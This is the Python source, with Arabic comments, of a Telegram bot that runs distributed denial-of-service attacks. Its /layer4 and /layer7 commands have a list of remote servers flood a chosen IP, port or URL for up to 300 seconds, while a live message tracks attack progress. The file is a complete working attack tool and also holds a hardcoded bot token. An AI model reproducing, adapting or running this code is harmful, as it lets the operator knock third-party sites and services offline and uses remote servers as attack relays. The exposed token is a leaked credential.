# -*- coding: utf-8 -*-
"""
نسخة معدّلة بالكامل:
- إيقاف فوري لجميع الاتصالات عند انتهاء الوقت
- رسالة لايف احترافية تُحدَّث تلقائياً
"""

import time
import requests
import asyncio
import socket
import http.server
import threading
import urllib3
import html
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.constants import ParseMode
from threading import Thread, Lock

# تعطيل تحذيرات SSL غير الآمنة
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== الإعدادات ====================
bot_token = "7157656859:AAFS8DDWpwWM_WgIi5wd6rum7wSaX4StSH8"
ALLOWED_CHAT_ID = [1254652875]

# ==================== المتغيرات العامة ====================
attack_status = {}
attack_sites = {}
attack_lock = Lock()
active_attacks = 0
last_attack_time = time.time()

# حدث إيقاف مشترك لكل خيوط الهجوم الحالي
stop_event = threading.Event()


# ==================== خادم وهمي لـ Render ====================
def run_mock_server():
    server_address = ('', 8080)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    print("Mock server running on port 8080...")
    httpd.serve_forever()


# ==================== قراءة المواقع ====================
def read_sites():
    try:
        with open("sites312.txt", "r") as file:
            sites = [line.strip() for line in file.readlines() if line.strip()]
        return sites
    except FileNotFoundError:
        print("Warning: sites312.txt not found. Returning empty list.")
        return []


# ==================== Layer 4 Attack ====================
def attack_site(site, ip, port, attack_time, local_stop_event):
    global active_attacks
    start_time = time.time()
    end_time = start_time + attack_time

    if not site.startswith("http://") and not site.startswith("https://"):
        site = "http://" + site

    session = requests.Session()

    try:
        while time.time() < end_time:
            # فحص الإيقاف الفوري
            if local_stop_event.is_set() or time.time() >= end_time:
                break

            try:
                url = f"{site}?host={ip}&port={port}&time={attack_time}"
                response = session.get(url, timeout=5, verify=False)
                if response.status_code != 200:
                    print(f"Site {site} returned status {response.status_code}. Retrying...")
                    continue
            except requests.exceptions.Timeout:
                print(f"Timeout occurred while attacking {site}. Retrying...")
                continue
            except requests.exceptions.RequestException as e:
                print(f"Error with site {site}: {e}")
                continue

            # نوم قابل للمقاطعة
            if local_stop_event.wait(timeout=2):
                break
    finally:
        # إغلاق الجلسة فوراً لإلغاء أي اتصال معلّق
        try:
            session.close()
        except Exception:
            pass

        elapsed = round(time.time() - start_time, 2)
        attack_status[site] = {
            'status': 'Stopped' if local_stop_event.is_set() else 'Completed',
            'time_taken': elapsed,
            'end_time': end_time,
            'total_time': attack_time
        }
        attack_sites[site] = 'Completed'

        with attack_lock:
            active_attacks -= 1
            if active_attacks < 0:
                active_attacks = 0


# ==================== Layer 7 Visit ====================
def visit_and_fill_data(site, ip, attack_time, local_stop_event):
    global active_attacks
    start_time = time.time()
    end_time = start_time + attack_time

    if not site.startswith("http://") and not site.startswith("https://"):
        site = "http://" + site

    session = requests.Session()

    try:
        while time.time() < end_time:
            if local_stop_event.is_set() or time.time() >= end_time:
                break

            try:
                url = f"{site}?host1={ip}&time1={attack_time}"
                response = session.get(url, timeout=5, verify=False)
                if response.status_code != 200:
                    print(f"Site {site} returned status {response.status_code}. Retrying...")
                    continue
            except requests.exceptions.Timeout:
                print(f"Timeout occurred while visiting {site}. Retrying...")
                continue
            except requests.exceptions.RequestException as e:
                print(f"Error with site {site}: {e}")
                continue

            if local_stop_event.wait(timeout=2):
                break
    finally:
        try:
            session.close()
        except Exception:
            pass

        elapsed = round(time.time() - start_time, 2)
        attack_status[site] = {
            'status': 'Stopped' if local_stop_event.is_set() else 'Visited',
            'time_taken': elapsed,
            'end_time': end_time,
            'total_time': attack_time
        }
        attack_sites[site] = 'Completed'

        with attack_lock:
            active_attacks -= 1
            if active_attacks < 0:
                active_attacks = 0


# ==================== بناء رسالة الحالة ====================
def build_live_status(total_sites, end_time, target, port=None, mode="L4"):
    now = time.time()
    remaining = max(0, int(end_time - now))

    completed = sum(1 for s in attack_sites.values() if s == 'Completed')
    running = total_sites - completed
    progress = int((completed / total_sites) * 100) if total_sites else 0

    bar_len = 20
    filled = int(bar_len * completed / total_sites) if total_sites else 0
    bar = "█" * filled + "░" * (bar_len - filled)

    if remaining == 0:
        status_emoji = "✅"
        status_text = "انتهى الهجوم"
    elif remaining <= 10:
        status_emoji = "🟠"
        status_text = "ينتهي قريباً"
    else:
        status_emoji = "🟢"
        status_text = "قيد التشغيل"

    mm, ss = divmod(remaining, 60)
    timer = f"{mm:02d}:{ss:02d}"

    if mode == "L4":
        target_line = f"<b>🎯 الهدف:</b> <code>{html.escape(str(target))}:{port}</code>"
        title = "⚡ <b>LAYER 4 ATTACK</b> ⚡"
    else:
        target_line = f"<b>🎯 الهدف:</b> <code>{html.escape(str(target))}</code>"
        title = "🌐 <b>LAYER 7 VISIT</b> 🌐"

    text = (
        f"{title}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{target_line}\n"
        f"<b>{status_emoji} الحالة:</b> {status_text}\n"
        f"<b>⏱️ الوقت المتبقي:</b> <code>{timer}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>📊 التقدم:</b> {bar} {progress}%\n"
        f"<b>🖥️ السيرفرات:</b> {completed}/{total_sites}\n"
        f"<b>⚙️ النشطة:</b> {running}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>يتم التحديث تلقائياً كل 3 ثوانٍ...</i>"
    )
    return text, remaining


# ==================== التحديث اللايف ====================
async def live_updater(context, chat_id, message_id, total_sites, end_time, target, port=None, mode="L4"):
    last_text = ""

    while True:
        text, remaining = build_live_status(total_sites, end_time, target, port, mode)

        if text != last_text:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML
                )
                last_text = text
            except Exception as e:
                if "not modified" not in str(e).lower():
                    print(f"edit error: {e}")

        if remaining <= 0:
            # إيقاف فوري لكل الاتصالات
            stop_event.set()
            await asyncio.sleep(1)

            try:
                final_text, _ = build_live_status(total_sites, end_time, target, port, mode)
                final_text = final_text.replace(
                    "يتم التحديث تلقائياً كل 3 ثوانٍ...",
                    "✅ تم إيقاف جميع الاتصالات."
                )
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=final_text,
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
            break

        await asyncio.sleep(3)


# ==================== /list ====================
async def list_commands(update: Update, context: CallbackContext):
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    await update.message.reply_text("""
Available commands:
/list - Show available commands.
/layer4 <ip> <port> <time> - Start attack on sites.
/layer7 <url> <time> - Visit sites and fill data.
""")


# ==================== حل اسم المضيف ====================
async def resolve_hostname(ip):
    loop = asyncio.get_running_loop()
    try:
        hostname = await loop.run_in_executor(None, socket.gethostbyaddr, ip)
        result = hostname[0]
        return result if result != ip else None
    except Exception:
        return None


# ==================== /layer4 ====================
async def attack(update: Update, context: CallbackContext):
    global active_attacks, last_attack_time, stop_event

    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    current_time = time.time()
    if current_time - last_attack_time < 10:
        await update.message.reply_text("⚠️ Please wait before starting another attack.")
        return

    if active_attacks > 0:
        await update.message.reply_text("⚠️ An attack is already in progress. Please wait until it finishes.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /layer4 <ip> <port> <time>")
        return

    try:
        time_duration = int(context.args[2])
        if time_duration > 300:
            await update.message.reply_text("❌ The attack time cannot exceed 300 seconds.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid time format. Please provide a valid number.")
        return

    ip = context.args[0]

    try:
        port = int(context.args[1])
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ Invalid port. Must be between 1 and 65535.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid port format. Please provide a valid number.")
        return

    protocol = "https" if port == 443 else "http"

    domain = await resolve_hostname(ip)
    target = domain if domain else ip
    target_url = f"{protocol}://{target}"

    sites = read_sites()
    if not sites:
        await update.message.reply_text("❌ No sites found in sites312.txt")
        return

    # إعادة تعيين حدث الإيقاف
    stop_event = threading.Event()

    with attack_lock:
        active_attacks = len(sites)

    end_time = time.time() + time_duration

    keyboard = [
        [InlineKeyboardButton("Checkhost", url=f"https://check-host.net/check-http?host={target_url}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = await update.message.reply_text(
        f"🚀 <b>بدء الهجوم...</b>\n"
        f"🎯 الهدف: <code>{html.escape(target)}:{port}</code>\n"
        f"⏱️ المدة: {time_duration}s\n"
        f"🖥️ عدد السيرفرات: {len(sites)}",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

    for site in sites:
        attack_sites[site] = 'Running'
        thread = Thread(
            target=attack_site,
            args=(site, ip, port, time_duration, stop_event),
            daemon=True
        )
        thread.start()

    last_attack_time = current_time

    asyncio.create_task(
        live_updater(context, msg.chat_id, msg.message_id, len(sites), end_time, target, port, "L4")
    )


# ==================== /layer7 ====================
async def fill_data(update: Update, context: CallbackContext):
    global active_attacks, last_attack_time, stop_event

    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    if active_attacks > 0:
        await update.message.reply_text("⚠️ Another operation is in progress. Please wait until it finishes.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /layer7 <url> <time>")
        return

    try:
        time_duration = int(context.args[1])
        if time_duration > 300:
            await update.message.reply_text("❌ The attack time cannot exceed 300 seconds.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid time format. Please provide a valid number.")
        return

    ip = context.args[0]

    current_time = time.time()
    if current_time - last_attack_time < 10:
        await update.message.reply_text("⚠️ Please wait before starting another attack.")
        return

    sites = read_sites()
    if not sites:
        await update.message.reply_text("❌ No sites found in sites312.txt")
        return

    stop_event = threading.Event()

    with attack_lock:
        active_attacks = len(sites)

    end_time = time.time() + time_duration

    msg = await update.message.reply_text(
        f"🌐 <b>بدء زيارة المواقع...</b>\n"
        f"🎯 الهدف: <code>{html.escape(ip)}</code>\n"
        f"⏱️ المدة: {time_duration}s\n"
        f"🖥️ عدد المواقع: {len(sites)}",
        parse_mode=ParseMode.HTML
    )

    for site in sites:
        attack_sites[site] = 'Running'
        thread = Thread(
            target=visit_and_fill_data,
            args=(site, ip, time_duration, stop_event),
            daemon=True
        )
        thread.start()

    last_attack_time = current_time

    asyncio.create_task(
        live_updater(context, msg.chat_id, msg.message_id, len(sites), end_time, ip, None, "L7")
    )


# ==================== /start ====================
async def start(update: Update, context: CallbackContext):
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    await update.message.reply_text("Welcome! Use /list for available commands.")


# ==================== main ====================
def main():
    threading.Thread(target=run_mock_server, daemon=True).start()

    application = Application.builder().token(bot_token).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("list", list_commands))
    application.add_handler(CommandHandler("layer4", attack))
    application.add_handler(CommandHandler("layer7", fill_data))

    application.run_polling()


if __name__ == '__main__':
    main()
